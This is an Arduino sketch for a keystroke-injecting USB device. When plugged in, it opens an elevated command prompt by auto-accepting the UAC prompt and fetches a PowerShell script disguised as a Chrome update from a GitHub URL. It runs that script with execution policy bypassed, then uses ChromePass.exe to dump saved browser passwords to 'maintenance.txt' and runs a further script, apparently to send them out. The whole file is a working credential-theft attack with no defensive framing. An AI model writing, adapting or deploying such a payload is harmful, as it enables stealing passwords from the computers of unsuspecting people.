#include "Keyboard.h"

void typeKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup() {
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(400);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("powershell Start-Process cmd -Verb runAs");
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(1000);
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print("cd / & mkdir chrome & cd chrome");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("echo (wget 'https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/ChromeUpdateDownload.ps1' -OutFile ChromeUpdateDownload.ps1) > b.ps1");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("powershell -ExecutionPolicy ByPass -File b.ps1");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("powershell -ExecutionPolicy ByPass -File ChromeUpdateDownload.ps1");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("ChromePass.exe /stext maintenance.txt");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("powershell ./maintenance.ps1");
  typeKey(KEY_RETURN);
  delay(100);
  
  /*typeKey(KEY_RETURN);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();*/
}

/* Unused endless loop */
void loop() {}
